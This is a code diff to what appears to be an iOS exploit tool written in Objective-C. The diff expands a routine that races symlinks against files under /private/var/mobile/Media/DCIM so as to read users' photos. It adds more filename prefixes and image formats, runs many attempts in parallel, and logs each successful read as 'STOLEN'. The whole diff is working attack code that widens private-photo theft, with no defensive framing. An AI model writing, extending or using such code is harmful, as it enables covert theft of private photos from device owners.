@@ -560,8 +560,11 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
            decoy:(NSData *)decoyData
            total:(int *)scannedTotal
 {
+    // 覆盖所有来源：相机/截屏 IMG_、编辑版 IMG_E、全景 PANO_；4 位和 5 位编号
     NSArray<NSNumber *> *delays = @[@0, @5, @10, @20, @30, @50, @80, @120];
-    NSArray<NSString *> *exts = @[@"HEIC", @"JPG", @"PNG", @"JPEG"];
+    NSArray<NSString *> *prefixes = @[@"IMG_%04d", @"IMG_%05d", @"IMG_E%04d", @"PANO_%04d"];
+    NSArray<NSString *> *exts = @[@"HEIC", @"HEIF", @"JPG", @"JPEG", @"PNG",
+                                  @"DNG", @"TIF", @"TIFF", @"GIF", @"BMP", @"WEBP"];
     __block int hits = 0;
     dispatch_semaphore_t limit = dispatch_semaphore_create(8);
     dispatch_group_t group = dispatch_group_create();
@@ -570,29 +573,36 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     for (int j = 0; j < count; j++) {
         dispatch_semaphore_wait(limit, DISPATCH_TIME_FOREVER);
         dispatch_group_async(group, q, ^{
-            int img = start + j;
-            for (int e = 0; e < 4; e++) {
-                NSString *ext = exts[(NSUInteger)e];
-                NSString *target = [NSString stringWithFormat:
-                    @"/private/var/mobile/Media/DCIM/%dAPPLE/IMG_%04d.%@",
-                    folder, img, ext];
-                NSString *racePath = [tmp stringByAppendingPathComponent:
-                    [NSString stringWithFormat:@"race_%d_%d_%d.%@", folder, img, e, ext]];
-                NSString *symPath = [tmp stringByAppendingPathComponent:
-                    [NSString stringWithFormat:@"sym_%d_%d_%d.%@", folder, img, e, ext]];
-                for (int a = 0; a < 8; a++) {
-                    if (scannedTotal) {
-                        @synchronized (self) { (*scannedTotal)++; }
-                    }
-                    if ([self tryExfil:target
-                              racePath:racePath
-                           symlinkPath:symPath
-                             decoyData:decoyData
-                                 delay:(useconds_t)[delays[(NSUInteger)a] unsignedIntValue]]) {
-                        @synchronized (self) { hits++; }
-                        [self log:[NSString stringWithFormat:
-                            @"STOLEN %dAPPLE/IMG_%04d.%@", folder, img, ext]];
-                        break;
+            int num = start + j;
+            for (NSUInteger p = 0; p < prefixes.count; p++) {
+                NSString *base = [NSString stringWithFormat:prefixes[p], num];
+                for (NSUInteger e = 0; e < exts.count; e++) {
+                    NSString *ext = exts[e];
+                    NSString *name = [NSString stringWithFormat:@"%@.%@", base, ext];
+                    NSString *target = [NSString stringWithFormat:
+                        @"/private/var/mobile/Media/DCIM/%dAPPLE/%@", folder, name];
+                    NSString *racePath = [tmp stringByAppendingPathComponent:
+                        [NSString stringWithFormat:@"race_%d_%lu_%lu_%lu.%@",
+                         folder, (unsigned long)num, (unsigned long)p,
+                         (unsigned long)e, ext]];
+                    NSString *symPath = [tmp stringByAppendingPathComponent:
+                        [NSString stringWithFormat:@"sym_%d_%lu_%lu_%lu.%@",
+                         folder, (unsigned long)num, (unsigned long)p,
+                         (unsigned long)e, ext]];
+                    for (NSUInteger a = 0; a < delays.count; a++) {
+                        if (scannedTotal) {
+                            @synchronized (self) { (*scannedTotal)++; }
+                        }
+                        if ([self tryExfil:target
+                                  racePath:racePath
+                               symlinkPath:symPath
+                                 decoyData:decoyData
+                                     delay:(useconds_t)[delays[a] unsignedIntValue]]) {
+                            @synchronized (self) { hits++; }
+                            [self log:[NSString stringWithFormat:
+                                @"STOLEN %dAPPLE/%@", folder, name]];
+                            break;
+                        }
                     }
                 }
             }
